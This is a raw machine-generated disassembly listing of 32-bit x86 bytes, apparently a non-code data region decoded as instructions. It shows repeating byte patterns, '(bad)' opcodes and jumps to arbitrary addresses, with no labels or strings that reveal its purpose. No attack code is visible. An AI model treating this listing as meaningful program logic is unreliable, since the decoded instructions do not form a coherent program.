  403f4a:	inc    ecx
  403f4b:	inc    ebx
  403f4c:	inc    eax
  403f4d:	inc    eax
  403f4e:	add    eax,0x434162
  403f53:	inc    eax
  403f54:	add    BYTE PTR [edx+0x5],ah
  403f57:	inc    eax
  403f58:	adc    BYTE PTR [edx+0x40],ah
  403f5b:	inc    ebx
  403f5c:	inc    ecx
  403f5d:	add    eax,0x4340
  403f62:	add    eax,0x404162
  403f67:	add    BYTE PTR [eax+0x43],al
  403f6a:	inc    eax
  403f6b:	add    eax,0x40d84049
  403f70:	lods   al,BYTE PTR ds:[esi]
  403f71:	test   al,0x37
  403f73:	jle    0x403fec
  403f75:	jb     0x403fdc
  403f77:	addr16 xchg ebp,eax
  403f79:	inc    ecx
  403f7a:	mov    cl,0x21
  403f7c:	pop    ebx
  403f7d:	inc    eax
  403f7e:	test   eax,0x342a668c
  403f83:	pop    ecx
  403f84:	mov    dl,0x6d
  403f86:	adc    BYTE PTR [ebp-0x30],ah
  403f89:	inc    esp
  403f8a:	mov    ebx,0x4045
  403f8f:	inc    ecx
  403f90:	inc    ebx
  403f91:	add    eax,0x41784062
  403f96:	inc    eax
  403f97:	inc    eax
  403f98:	add    BYTE PTR [edi],cl
  403f9a:	bound  eax,QWORD PTR [ebx+0x0]
  403f9d:	add    eax,0x25006240
  403fa2:	inc    eax
  403fa3:	add    eax,0x40254143
  403fa8:	add    eax,0x68620000
  403fad:	inc    eax
  403fae:	arpl   WORD PTR [eax+0x9],dx
  403fb1:	inc    edx
  403fb2:	ins    BYTE PTR es:[edi],dx
  403fb3:	retf   0x144
  403fb6:	inc    ecx
  403fb7:	or     esp,DWORD PTR ds:0xb552a861
  403fbd:	inc    eax
  403fbe:	xor    cl,dl
  403fc0:	pop    esi
  403fc1:	test   BYTE PTR [ecx+0x28],al
  403fc4:	inc    esp
  403fc5:	inc    eax
  403fc6:	pop    ecx
  403fc7:	or     DWORD PTR [esi],0x43
  403fca:	add    BYTE PTR [eax],al
  403fcc:	add    BYTE PTR [ecx+0x40],al
  403fcf:	bound  esp,QWORD PTR [esi+0x0]
  403fd2:	inc    eax
  403fd3:	add    eax,0x5400000
  403fd8:	inc    ecx
  403fd9:	inc    eax
  403fda:	inc    eax
  403fdb:	bound  esp,QWORD PTR ds:0x25050043
  403fe1:	inc    ecx
  403fe2:	inc    ebx
  403fe3:	inc    eax
  403fe4:	test   BYTE PTR [eax+0x0],al
  403fe7:	bound  ebx,QWORD PTR [eax+0x62]
  403fea:	inc    ecx
  403feb:	inc    eax
  403fec:	arpl   WORD PTR [edx],bp
  403fee:	cs mov edi,0x880d9713
  403ff4:	outs   dx,BYTE PTR ds:[esi]
  403ff5:	adc    bl,BYTE PTR [ebx]
  403ff7:	inc    esp
  403ff8:	inc    eax
  403ff9:	inc    ebp
  403ffa:	sbb    eax,0xf25ca891
  403fff:	mov    edi,0xd463f612
  404004:	push   ebx
  404005:	or     BYTE PTR [eax-0x49],0x10
  404009:	bound  eax,QWORD PTR [eax+0x41]
  40400c:	and    eax,0x40000500
  404011:	inc    ebx
  404012:	add    eax,0x40624041
  404017:	inc    ebx
  404018:	add    eax,0x43402541
  40401d:	bound  eax,QWORD PTR [eax+0x43]
  404020:	int3   
  404021:	inc    eax
  404022:	bound  eax,QWORD PTR [eax]
  404024:	inc    ecx
  404025:	inc    eax
  404026:	inc    eax
  404027:	add    eax,0x70486c05
  40402c:	push   ebx
  40402d:	sub    al,bl
  40402f:	jl     0x4040ae
  404031:	inc    eax
  404032:	inc    esp
  404033:	mov    BYTE PTR [ecx+eax*2],bh
  404036:	inc    esi
  404037:	inc    ebx
  404038:	pop    ds
  404039:	daa    
  40403a:	and    DWORD PTR [edx+0x47],esp
  40403d:	or     DWORD PTR [ecx+0x2e],ebp
  404040:	dec    edi
  404041:	or     al,0x78
  404043:	inc    ecx
  404044:	scas   al,BYTE PTR es:[edi]
  404045:	cld    
  404046:	sub    BYTE PTR ds:0x2aa4401f,ch
  40404c:	test   eax,0xfeca6066
  404051:	sub    DWORD PTR [edx],esi
  404053:	mov    edi,0x1d5c4e90
  404058:	repz dec edx
  40405a:	inc    esi
  40405b:	sub    al,BYTE PTR [ecx-0x44]
  40405e:	xor    ebx,esp
  404060:	push   eax
  404061:	push   esp
  404062:	push   edx
  404063:	mulps  xmm4,XMMWORD PTR [edx+0x40]
  404067:	and    eax,0x5406600
  40406c:	inc    ebx
  40406d:	inc    ecx
  40406e:	inc    eax
  40406f:	inc    eax
  404070:	inc    ebx
  404071:	add    BYTE PTR [eax],al
  404073:	add    BYTE PTR [edx-0x34],ah
  404076:	inc    eax
  404077:	add    eax,0x40004041
  40407c:	inc    ecx
  40407d:	int3   
  40407e:	add    BYTE PTR [ebx-0x7c],al
  404081:	add    eax,0x5406240
  404086:	bound  esi,QWORD PTR [ebp+ebp*2+0x1f]
  40408a:	jno    0x4040cc
  40408c:	inc    eax
  40408d:	xor    al,0x88
  40408f:	xchg   ecx,eax
  404090:	and    BYTE PTR [edx+0x6f],ch
  404093:	xor    eax,0xbf6c4301
  404098:	(bad)  
  40409a:	mov    bl,0x64
  40409c:	scas   al,BYTE PTR es:[edi]
  40409d:	cs mov edi,0x179bc520
  4040a3:	inc    eax
  4040a4:	mov    eax,0x4f479c38
  4040a9:	inc    eax
  4040aa:	bound  ebx,QWORD PTR [eax+0x41]
  4040ad:	add    eax,0x40404340
  4040b2:	inc    ebx
  4040b3:	inc    eax
  4040b4:	test   BYTE PTR [eax],al
  4040b6:	add    eax,0x40624041
  4040bb:	inc    eax
  4040bc:	add    BYTE PTR [edx+0x5],ah
  4040bf:	inc    ebx
  4040c0:	add    BYTE PTR [eax+0x78],al
  4040c3:	inc    ecx
  4040c4:	add    BYTE PTR [eax+0x41],bl
  4040c7:	bound  edx,QWORD PTR [esi-0x3e1ecc4a]
  4040cd:	rol    DWORD PTR gs:[eax+0x2a],cl
  4040d1:	add    DWORD PTR [eax+0x44],eax
  4040d4:	pop    esp
  4040d5:	cdq    
  4040d6:	sub    BYTE PTR [edi+ebx*4-0x61],al
  4040da:	cmp    DWORD PTR [ebx+0x62],eax
  4040dd:	ins    BYTE PTR es:[edi],dx
  4040de:	test   al,0x38
  4040e0:	dec    ecx
  4040e1:	push   ss
  4040e2:	clc    
  4040e3:	xlat   BYTE PTR ds:[ebx]
  4040e4:	test   eax,0xddc34052
  4040e9:	mov    esi,0xb2449840
  4040ee:	sub    cl,BYTE PTR [eax+0x40]
  4040f1:	test   BYTE PTR [eax],al
  4040f3:	int3   
  4040f4:	bound  eax,QWORD PTR ds:0xcc840f41
  4040fa:	inc    ebx
  4040fb:	add    BYTE PTR [eax+0x0],al
  4040fe:	inc    eax
  4040ff:	inc    eax
  404100:	inc    eax
  404101:	int3   
  404102:	add    BYTE PTR ds:0x62404341,al
  404108:	pop    eax
  404109:	add    BYTE PTR [ebx+0x40],al
  40410c:	bound  ecx,QWORD PTR [edi]
  40410e:	inc    eax
  40410f:	pop    edi
  404110:	inc    esp
  404111:	sub    esp,DWORD PTR [ebx+0x42]
  404114:	cld    
  404115:	inc    ecx
  404116:	add    eax,0x94e271d5
  40411b:	arpl   WORD PTR es:[ebx+ecx*8-0x57bfb3a6],di
  404123:	js     0x404147
  404125:	and    al,0x40
  404127:	dec    esi
  404128:	jno    0x40418a
  40412a:	inc    eax
  40412b:	adc    ch,BYTE PTR [esp+edi*4+0x40]
  40412f:	stos   DWORD PTR es:[edi],eax
  404130:	add    bh,BYTE PTR [eax]
  404132:	inc    eax
  404133:	pop    es
  404134:	push   0xb1ef4315
  404139:	inc    eax
  40413a:	inc    ebx
  40413b:	inc    esi
  40413c:	dec    ecx
  40413d:	leave  
  40413e:	test   eax,0xa82f405d
  404143:	fs call 0xb1638d01
  404149:	add    BYTE PTR [eax],al
  40414b:	inc    eax
  40414c:	inc    eax
  40414d:	cmovno eax,DWORD PTR ds:0x40056243
  404154:	int3   
  404155:	add    ah,cl
  404157:	inc    eax
  404158:	inc    eax
  404159:	bound  eax,QWORD PTR [ecx+0x0]
  40415c:	add    BYTE PTR [edi],cl
  40415e:	inc    ebx
  40415f:	inc    eax
  404160:	inc    eax
  404161:	add    BYTE PTR [ecx+0x43],al
  404164:	add    eax,0x40256240
  404169:	bound  eax,QWORD PTR [eax]
  40416b:	inc    eax
  40416c:	sub    BYTE PTR ds:0x6fd605dd,dh
  404172:	add    BYTE PTR [ecx],ch
  404174:	push   0x74
  404176:	or     eax,0x55f668c9
  40417b:	inc    eax
  40417c:	xor    eax,0x689add45
  404181:	add    eax,DWORD PTR ds:0x4140cc00
  404187:	inc    eax
  404188:	inc    ebx
  404189:	bound  esp,QWORD PTR ds:0x41400043
  40418f:	add    BYTE PTR [eax],al
  404191:	add    eax,0x43624062
  404196:	inc    ecx
  404197:	inc    eax
  404198:	inc    eax
  404199:	inc    eax
  40419a:	add    eax,0x40624340
  40419f:	add    eax,0x40664140
  4041a4:	hlt    
  4041a5:	xor    al,0x46
  4041a7:	bound  ebx,QWORD PTR [edi+esi*4-0x42]
  4041ab:	(bad)
  4041ae:	pop    ebx
  4041af:	dec    eax
  4041b0:	nop
  4041b1:	inc    eax
  4041b2:	int3   
  4041b3:	aaa    
  4041b4:	pusha  
  4041b5:	inc    eax
  4041b6:	nop
  4041b7:	dec    ecx
  4041b8:	les    edx,FWORD PTR [edx+0x300ee6ce]
  4041be:	dec    ebx
  4041bf:	and    eax,0xa3a8c3e7
  4041c4:	adc    DWORD PTR [eax-0xb],eax
  4041c7:	jns    0x4041fd
  4041c9:	cwde   
  4041ca:	je     0x404180
  4041cc:	mov    ebp,0x42244239
  4041d1:	mov    bh,0x2a
  4041d3:	cld    
  4041d4:	adc    al,0x40
  4041d6:	imul   BYTE PTR [eax+0x6841a282]
  4041dc:	adc    DWORD PTR [edx],esi
  4041de:	jnp    0x4041f0
  4041e0:	mov    eax,0x40050043
  4041e5:	js     0x4041f7
  4041e7:	inc    ecx
  4041e8:	bound  eax,QWORD PTR [eax+0x40]
  4041eb:	sldt   WORD PTR [eax-0x34]
  4041ef:	js     0x404253
  4041f1:	add    eax,0x40664143
  4041f6:	inc    ebx
  4041f7:	add    BYTE PTR [ecx+0x5],al
  4041fa:	js     0x40423c
  4041fc:	bound  eax,QWORD PTR [eax+0x0]
  4041ff:	inc    eax
  404200:	mov    bh,0xd5
  404202:	dec    esi
  404203:	retf   
  404204:	inc    eax
  404205:	test   eax,0xe4400d44
  40420a:	mov    al,0x35
  40420c:	and    eax,DWORD PTR ds:0x6240c902
  404212:	fwait
  404213:	and    eax,DWORD PTR [eax+0x67]
  404216:	inc    ebx
  404217:	mov    esi,0x57ccb067
  40421c:	inc    eax
  40421d:	(bad)  [ecx]
  40421f:	inc    ecx
  404220:	inc    ebx
  404221:	inc    eax
  404222:	inc    eax
  404223:	add    eax,0x434162
  404228:	inc    eax
  404229:	add    BYTE PTR [edx+0x5],ah
  40422c:	inc    eax
  40422d:	adc    BYTE PTR [edx+0x40],ah
  404230:	inc    ebx
  404231:	inc    ecx
  404232:	add    eax,0x4340
  404237:	add    eax,0x404162
  40423c:	add    BYTE PTR [eax+0x43],al
  40423f:	inc    eax
  404240:	add    eax,0x8b63502f
  404245:	das    
  404246:	xor    BYTE PTR cs:[eax],0x67
  40424a:	cli    
  40424b:	or     DWORD PTR [edi+0x11],ebx
  40424e:	jo     0x4042b3
  404250:	js     0x4041d2
  404252:	dec    eax
  404253:	bound  edi,QWORD PTR [ebx]
  404255:	pop    ecx
  404256:	inc    eax
  404257:	mov    ebx,0x41000040
  40425c:	inc    ebx
  40425d:	add    eax,0x41784062
  404262:	inc    eax
  404263:	inc    eax
  404264:	add    BYTE PTR [edi],cl
  404266:	bound  eax,QWORD PTR [ebx+0x0]
  404269:	add    eax,0x25006240
  40426e:	inc    eax
  40426f:	add    eax,0x40254143
  404274:	add    eax,0xf0620000
  404279:	pop    edx
  40427a:	add    eax,0x60f23044
  40427f:	test   al,0x62
  404281:	inc    eax
  404282:	retf   
  404283:	dec    edx
  404284:	pop    esp
  404285:	es inc eax
  404287:	inc    eax
  404288:	push   ebx
  404289:	inc    eax
  40428a:	push   edi
  40428b:	test   eax,0x1254c77
  404290:	stos   DWORD PTR es:[edi],eax
  404291:	inc    esp
  404292:	stos   DWORD PTR es:[edi],eax
  404293:	mov    al,ds:0xac40311f
  404298:	jl     0x4042dd
  40429a:	add    BYTE PTR [eax],al
  40429c:	add    BYTE PTR [ecx+0x40],al
  40429f:	bound  esp,QWORD PTR [esi+0x0]
  4042a2:	inc    eax
  4042a3:	add    eax,0x5400000
  4042a8:	inc    ecx
  4042a9:	inc    eax
  4042aa:	inc    eax
  4042ab:	bound  esp,QWORD PTR ds:0x25050043
  4042b1:	inc    ecx
  4042b2:	inc    ebx
  4042b3:	inc    eax
  4042b4:	test   BYTE PTR [eax+0x0],al
  4042b7:	bound  ebx,QWORD PTR [eax+0x62]
  4042ba:	inc    ecx
  4042bb:	inc    eax
  4042bc:	mov    ah,0xc0
  4042be:	inc    ecx
  4042bf:	add    eax,0x52b02805
  4042c4:	cmp    eax,0xbbaacd48
  4042c9:	pusha  
  4042ca:	sub    BYTE PTR [ebp-0x3f],ah
  4042cd:	inc    eax
  4042ce:	mov    al,ds:0x44f6bbad
  4042d3:	sbb    al,0xb4
  4042d5:	adc    BYTE PTR [edx+0x40],ah
  4042d8:	inc    ecx
  4042d9:	and    eax,0x40000500
  4042de:	inc    ebx
  4042df:	add    eax,0x40624041
  4042e4:	inc    ebx
  4042e5:	add    eax,0x43402541
  4042ea:	bound  eax,QWORD PTR [eax+0x43]
  4042ed:	int3   
  4042ee:	inc    eax
  4042ef:	bound  eax,QWORD PTR [eax]
  4042f1:	inc    ecx
  4042f2:	inc    eax
  4042f3:	inc    eax
  4042f4:	add    eax,0x3f4b5005
  4042f9:	dec    esi
  4042fa:	pusha  
  4042fb:	mov    esi,0xe8f80580
  404300:	xor    dl,BYTE PTR [ecx-0x369d6fb0]
  404306:	in     eax,dx
  404307:	test   al,0x60
  404309:	sub    al,0x51
  40430b:	cmp    esi,DWORD PTR [ebx-0x70]
  40430e:	bound  eax,QWORD PTR [eax+0x25]
  404311:	add    BYTE PTR [esi+0x40],ah
  404314:	add    eax,0x40404143
  404319:	inc    ebx
  40431a:	add    BYTE PTR [eax],al
  40431c:	add    BYTE PTR [edx-0x34],ah
  40431f:	inc    eax
  404320:	add    eax,0x40004041
  404325:	inc    ecx
  404326:	int3   
  404327:	add    BYTE PTR [ebx-0x7c],al
  40432a:	add    eax,0x5406240
  40432f:	bound  ebp,QWORD PTR [ecx+ecx*2]
  404332:	xor    al,0xf3
  404334:	inc    ecx
  404335:	cmp    al,0x34
  404337:	mov    edi,0xca541c8
  40433c:	mov    eax,ds:0xbc0c653c
  404341:	ja     0x404378
  404343:	xchg   ebp,eax
  404344:	jno    0x4042c6
  404346:	push   esp
  404347:	dec    ecx
  404348:	(bad)  
  404349:	fsubr  QWORD PTR [eax]
  40434b:	bound  edx,QWORD PTR [ebx+0x3f]
  40434e:	inc    esi
  40434f:	or     DWORD PTR ds:0xd159ca6b,esi
  404355:	and    BYTE PTR ds:0x1f88bf30,dh
  40435b:	jg     0x4043a5
  40435d:	(bad)  
  40435e:	les    edx,FWORD PTR [eax+ecx*2]
  404361:	je     0x404352
  404363:	lahf   
  404364:	icebp  
  404365:	sti    
  404366:	stos   DWORD PTR es:[edi],eax
  404367:	scas   al,BYTE PTR es:[edi]
  404368:	cmp    eax,0x40e307ac
  40436d:	bound  ebx,QWORD PTR [eax+0x41]
  404370:	add    eax,0x40404340
  404375:	inc    ebx
  404376:	inc    eax
  404377:	test   BYTE PTR [eax],al
  404379:	add    eax,0x40624041
  40437e:	inc    eax
  40437f:	add    BYTE PTR [edx+0x5],ah
  404382:	inc    ebx
  404383:	add    BYTE PTR [eax+0x78],al
  404386:	inc    ecx
  404387:	add    BYTE PTR [eax+0x41],bl
  40438a:	bound  esp,QWORD PTR [ebx]
  40438c:	in     al,0x7a
  40438e:	test   al,0xc3
  404390:	inc    edi
  404391:	idiv   BYTE PTR [ebx+0x58]
  404394:	arpl   WORD PTR [edx],sp
  404396:	adc    dl,BYTE PTR [ecx+0x2d615d3e]
  40439c:	std    
  40439d:	add    DWORD PTR [eax-0x41],ecx
  4043a0:	aad    0xf3
  4043a2:	aas    
  4043a3:	and    al,0x1c
  4043a5:	jle    0x4043e9
  4043a7:	ins    BYTE PTR es:[edi],dx
  4043a8:	and    BYTE PTR [esi],0x50
  4043ab:	inc    eax
  4043ac:	test   BYTE PTR [eax],al
  4043ae:	int3   
  4043af:	bound  eax,QWORD PTR ds:0xcc840f41
  4043b5:	inc    ebx
  4043b6:	add    BYTE PTR [eax+0x0],al
  4043b9:	inc    eax
  4043ba:	inc    eax
  4043bb:	inc    eax
  4043bc:	int3   
  4043bd:	add    BYTE PTR ds:0x62404341,al
  4043c3:	pop    eax
  4043c4:	add    BYTE PTR [ebx+0x40],al
  4043c7:	bound  ecx,QWORD PTR [edi]
  4043c9:	inc    eax
  4043ca:	jae    0x404399
  4043cc:	inc    eax
  4043cd:	mov    BYTE PTR [ebp+0x65],0x9a
  4043d1:	repnz inc edx
  4043d3:	or     al,0x28
  4043d5:	pop    esp
  4043d6:	inc    edi
  4043d7:	inc    esp
  4043d8:	idiv   BYTE PTR [edi+0x6212ecf1]
  4043de:	aam    0xe4
  4043e0:	xchg   DWORD PTR [ebx+ecx*4-0x77],esi
  4043e4:	mov    esp,0x4b2ae5c0
  4043e9:	push   0x44435896
  4043ee:	add    DWORD PTR [eax-0x26482cb9],ebp
  4043f4:	mov    al,0x62
  4043f6:	jmp    0xdab560b
  4043fb:	dec    eax
  4043fc:	fadd   QWORD PTR [eax]
  4043fe:	add    BYTE PTR [eax+0x40],al
  404401:	cmovno eax,DWORD PTR ds:0x40056243
  404408:	int3   
  404409:	add    ah,cl
  40440b:	inc    eax
  40440c:	inc    eax
  40440d:	bound  eax,QWORD PTR [ecx+0x0]
  404410:	add    BYTE PTR [edi],cl
  404412:	inc    ebx
  404413:	inc    eax
  404414:	inc    eax
  404415:	add    BYTE PTR [ecx+0x43],al
  404418:	add    eax,0x40256240
  40441d:	bound  eax,QWORD PTR [eax]
  40441f:	mov    ss,WORD PTR [eax+ecx*2+0x6c]
  404423:	repz adc ecx,DWORD PTR [eax-0x30]
  404427:	sub    al,0x2a
  404429:	inc    ecx
  40442a:	xchg   ebx,eax
  40442b:	imul   esi,ebx,0x480a4cd9
  404431:	inc    edi
  404432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404433:	pop    edi
  404434:	es and eax,0xa02aabcd
  40443a:	cmp    eax,0xb0a8b355
  40443f:	or     BYTE PTR [edi],0x46
  404442:	shl    ecx,1
  404444:	in     eax,0x12
  404446:	inc    ecx
  404447:	jae    0x4043f4
  404449:	test   al,0xd
  40444b:	popa   
  40444c:	xor    BYTE PTR [eax+0x1242447b],bh
  404452:	ret    
  404453:	cdq    
  404454:	add    eax,0x4140cc00
  404459:	inc    eax
  40445a:	inc    ebx
  40445b:	bound  esp,QWORD PTR ds:0x41400043
  404461:	add    BYTE PTR [eax],al
  404463:	add    eax,0x43624062
  404468:	inc    ecx
  404469:	inc    eax
  40446a:	inc    eax
  40446b:	inc    eax
  40446c:	add    eax,0x40624340
  404471:	add    eax,0x40664140
  404476:	das    
  404477:	inc    ecx
  404478:	pop    eax
  404479:	inc    edx
  40447a:	inc    ebx
  40447b:	dec    eax
  40447c:	test   al,0x32
  40447e:	inc    ebx
  40447f:	sbb    BYTE PTR [ebx+0x41],ah
  404482:	outs   dx,DWORD PTR ds:[esi]
  404483:	adc    DWORD PTR [edx+0x72],esi
  404486:	(bad)  
  404487:	dec    eax
  404488:	push   es
  404489:	fdivr  QWORD PTR [ebx+ecx*8]
  40448c:	mul    BYTE PTR [ebx+eax*1]
  40448f:	push   ebx
  404490:	xor    eax,0xcb4364a8
  404495:	outs   dx,DWORD PTR ds:[esi]
  404497:	rol    DWORD PTR [eax+0x3c0d7da8],0x9
  40449e:	jns    0x4044cc
  4044a0:	lds    edx,FWORD PTR [edi+0x43]
  4044a3:	add    BYTE PTR ds:0x41107840,al
  4044a9:	bound  eax,QWORD PTR [eax+0x40]
  4044ac:	sldt   WORD PTR [eax-0x34]
  4044b0:	js     0x404514
  4044b2:	add    eax,0x40664143
  4044b7:	inc    ebx
  4044b8:	add    BYTE PTR [ecx+0x5],al
  4044bb:	js     0x4044fd
  4044bd:	bound  eax,QWORD PTR [eax+0x0]
  4044c0:	inc    eax
  4044c1:	cmp    al,0x20
  4044c3:	rcl    DWORD PTR [esi*1+0x646e4165],0x44
  4044cb:	sub    DWORD PTR [edi],esp
  4044cd:	inc    ecx
  4044ce:	xchg   DWORD PTR [eax+0x5b],esi
  4044d1:	sub    DWORD PTR [edx],eax
  4044d3:	in     al,dx
  4044d4:	inc    ebx
  4044d5:	push   eax
  4044d6:	inc    edi
  4044d7:	sar    BYTE PTR [eax+0x38],0x17
  4044db:	setno  BYTE PTR [ecx+0x43]
  4044df:	inc    eax
  4044e0:	inc    eax
  4044e1:	add    eax,0x434162
  4044e6:	inc    eax
  4044e7:	add    BYTE PTR [edx+0x5],ah
  4044ea:	inc    eax
  4044eb:	adc    BYTE PTR [edx+0x40],ah
  4044ee:	inc    ebx
  4044ef:	inc    ecx
  4044f0:	add    eax,0x4340
  4044f5:	add    eax,0x404162
  4044fa:	add    BYTE PTR [eax+0x43],al
  4044fd:	inc    eax
  4044fe:	add    eax,0x8c5a3578
  404503:	jb     0x404537
  404505:	sub    dl,BYTE PTR [esi]
  404507:	push   ss
  404508:	jno    0x4044e8
  40450a:	bound  ebp,QWORD PTR [ecx+0x44]
  40450d:	mov    ecx,0x14b850d1
  404512:	pop    esi
  404513:	mov    esp,0x701d534f
  404518:	ret    
  404519:	jle    0x40453f
  40451b:	(bad)  
  40451c:	lds    edx,FWORD PTR [edx]
  40451e:	push   edi
  40451f:	daa    
  404520:	dec    edx
  404521:	(bad)  
  404523:	retf   
  404524:	int3   
  404525:	mov    ebx,0x2344b05a
  40452a:	call   0xd614ed75
  40452f:	ins    DWORD PTR es:[edi],dx
  404530:	(bad)  
  404531:	and    al,0x40
  404533:	add    BYTE PTR [eax],al
  404535:	inc    ecx
  404536:	inc    ebx
  404537:	add    eax,0x41784062
  40453c:	inc    eax
  40453d:	inc    eax
  40453e:	add    BYTE PTR [edi],cl
  404540:	bound  eax,QWORD PTR [ebx+0x0]
  404543:	add    eax,0x25006240
  404548:	inc    eax
  404549:	add    eax,0x40254143
  40454e:	add    eax,0xa8620000
  404553:	jge    0x404566
  404555:	mov    ds,WORD PTR [eax+0x47]
  404558:	dec    edi
  404559:	sbb    DWORD PTR [ecx],edi
  40455b:	fimul  DWORD PTR [eax-0xa]
  40455e:	jno    0x4044f0
  404560:	inc    esp
  404561:	in     al,dx
  404562:	jnp    0x404580
  404564:	retf   
  404565:	push   eax
  404566:	jne    0x40457b
  404568:	push   eax
  404569:	cmp    eax,0x92484262
  40456e:	shr    dl,cl
  404570:	adc    al,0x4b
  404572:	retf   
  404573:	fld    QWORD PTR ds:0x4a5cffa0
  404579:	xor    BYTE PTR [eax],al
  40457b:	mov    ds:0x903394cb,eax
  404580:	arpl   si,bp
  404582:	bound  edi,QWORD PTR [ebp+0x70]
  404585:	add    DWORD PTR [edi],esi
  404587:	inc    ebx
  404588:	add    BYTE PTR [eax],al
  40458a:	add    BYTE PTR [ecx+0x40],al
  40458d:	bound  esp,QWORD PTR [esi+0x0]
  404590:	inc    eax
  404591:	add    eax,0x5400000
  404596:	inc    ecx
  404597:	inc    eax
  404598:	inc    eax
  404599:	bound  esp,QWORD PTR ds:0x25050043
  40459f:	inc    ecx
  4045a0:	inc    ebx
  4045a1:	inc    eax
  4045a2:	test   BYTE PTR [eax+0x0],al
  4045a5:	bound  ebx,QWORD PTR [eax+0x62]
  4045a8:	inc    ecx
  4045a9:	inc    eax
  4045aa:	pusha  
  4045ab:	cwde   
  4045ac:	loope  0x404611
  4045ae:	fld    DWORD PTR [esi-0x1b]
  4045b1:	rcr    DWORD PTR [esi+0x62],1
  4045b4:	test   al,0x30
  4045b6:	loopne 0x4045b5
  4045b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045b9:	adc    DWORD PTR fs:[eax+0x12],eax
  4045bd:	sbb    al,0x50
  4045bf:	aam    0xa4
  4045c1:	icebp  
  4045c2:	stos   DWORD PTR es:[edi],eax
  4045c3:	mov    BYTE PTR [esp+edx*8+0x79976262],cl
  4045ca:	repz sub edx,DWORD PTR ds:0x80fec5a
  4045d1:	repz adc DWORD PTR [ecx+0x3c2c40cb],eax
  4045d8:	mov    WORD PTR [edi+0x36],ss
  4045db:	fist   WORD PTR [ecx]
  4045dd:	add    BYTE PTR [edx+0x7a],ah
  4045e0:	mov    esi,0x40621033
  4045e5:	inc    ecx
  4045e6:	and    eax,0x40000500
  4045eb:	inc    ebx
  4045ec:	add    eax,0x40624041
  4045f1:	inc    ebx
  4045f2:	add    eax,0x43402541
  4045f7:	bound  eax,QWORD PTR [eax+0x43]
  4045fa:	int3   
  4045fb:	inc    eax
  4045fc:	bound  eax,QWORD PTR [eax]
  4045fe:	inc    ecx
  4045ff:	inc    eax
  404600:	inc    eax
  404601:	add    eax,0x44403005
  404606:	inc    eax
  404607:	fldenv [eax]
  404609:	test   DWORD PTR [edx-0x4b],0x802e81a2
  404610:	outs   dx,DWORD PTR ds:[esi]
  404611:	jmp    0x404644
  404613:	adc    al,BYTE PTR [ecx-0x339c3c3d]
  404619:	sbb    BYTE PTR [eax+0x23],bl
  40461c:	jnp    0x4045da
  40461e:	bound  ebx,QWORD PTR [edi]
  404620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404621:	push   esi
  404622:	sar    edx,1
  404624:	retf   
  404625:	dec    ecx
  404626:	bound  eax,QWORD PTR [eax+0x25]
  404629:	add    BYTE PTR [esi+0x40],ah
  40462c:	add    eax,0x40404143
  404631:	inc    ebx
  404632:	add    BYTE PTR [eax],al
  404634:	add    BYTE PTR [edx-0x34],ah
  404637:	inc    eax
  404638:	add    eax,0x40004041
  40463d:	inc    ecx
  40463e:	int3   
  40463f:	add    BYTE PTR [ebx-0x7c],al
  404642:	add    eax,0x5406240
  404647:	bound  esp,QWORD PTR [edx]
  404649:	sub    BYTE PTR ds:0x67484494,al
  40464f:	sub    eax,0x86cb6224
  404654:	xor    DWORD PTR [ecx],edx
  404656:	cmp    BYTE PTR ss:[edx-0x25],ah
  40465a:	cwde   
  40465b:	lds    edi,FWORD PTR [edi]
  40465d:	imul   eax,DWORD PTR [ecx+0x48],0x40
  404661:	bound  ebx,QWORD PTR [eax+0x41]
  404664:	add    eax,0x40404340
  404669:	inc    ebx
  40466a:	inc    eax
  40466b:	test   BYTE PTR [eax],al
  40466d:	add    eax,0x40624041
  404672:	inc    eax
  404673:	add    BYTE PTR [edx+0x5],ah
  404676:	inc    ebx
  404677:	add    BYTE PTR [eax+0x78],al
  40467a:	inc    ecx
  40467b:	add    BYTE PTR [eax+0x41],bl
  40467e:	bound  ebp,QWORD PTR [edx]
  404680:	mov    ebx,0x1115b2e7
  404685:	mov    al,0x84
  404687:	inc    eax
  404688:	test   al,0x7f
  40468a:	jg     0x404620
  40468c:	push   ecx
  40468d:	cmp    eax,0xef1053c3
  404692:	(bad)  
  404693:	cs jno 0x404659
  404696:	pop    esp
  404697:	and    BYTE PTR [ebp+eax*8+0x6d107a01],ah
  40469e:	aaa    
  40469f:	cld    
  4046a0:	inc    edx
  4046a1:	sub    bh,BYTE PTR [ebp-0x57bbce8f]
  4046a7:	arpl   sp,bp
  4046a9:	inc    eax
  4046aa:	test   BYTE PTR [eax],al
  4046ac:	int3   
  4046ad:	bound  eax,QWORD PTR ds:0xcc840f41
  4046b3:	inc    ebx
  4046b4:	add    BYTE PTR [eax+0x0],al
  4046b7:	inc    eax
  4046b8:	inc    eax
  4046b9:	inc    eax
  4046ba:	int3   
  4046bb:	add    BYTE PTR ds:0x62404341,al
  4046c1:	pop    eax
  4046c2:	add    BYTE PTR [ebx+0x40],al
  4046c5:	bound  ecx,QWORD PTR [edi]
  4046c7:	inc    eax
  4046c8:	xor    al,0x24
  4046ca:	inc    ecx
  4046cb:	and    edi,DWORD PTR [edx]
  4046cd:	adc    BYTE PTR [esp+ebp*1+0x50],dh
  4046d1:	pop    esi
  4046d2:	mov    bl,0x73
  4046d4:	fmul   QWORD PTR [eax+ecx*1+0x56a7ab64]
  4046db:	xchg   ebp,eax
  4046dc:	add    esp,DWORD PTR [edi]
  4046de:	leave  
  4046df:	ja     0x4046a4
  4046e1:	mov    ebx,0x2f3ed271
  4046e6:	dec    eax
  4046e7:	stos   DWORD PTR es:[edi],eax
  4046e8:	(bad)  
  4046e9:	cwde   
  4046ea:	ja     0x40470e
  4046ec:	pop    ebp
  4046ed:	(bad)  
  4046ee:	or     eax,0x2905bc
  4046f3:	add    BYTE PTR [eax+0x40],al
  4046f6:	cmovno eax,DWORD PTR ds:0x40056243
  4046fd:	int3   
  4046fe:	add    ah,cl
  404700:	inc    eax
  404701:	inc    eax
  404702:	bound  eax,QWORD PTR [ecx+0x0]
  404705:	add    BYTE PTR [edi],cl
  404707:	inc    ebx
  404708:	inc    eax
  404709:	inc    eax
  40470a:	add    BYTE PTR [ecx+0x43],al
  40470d:	add    eax,0x40256240
  404712:	bound  eax,QWORD PTR [eax]
  404714:	xchg   ebx,eax
  404715:	inc    esi
  404716:	bound  edx,QWORD PTR [eax-0x5f78d0be]
  40471c:	inc    esp
  40471d:	jae    0x404776
  40471f:	arpl   WORD PTR [ecx+0x27],ax
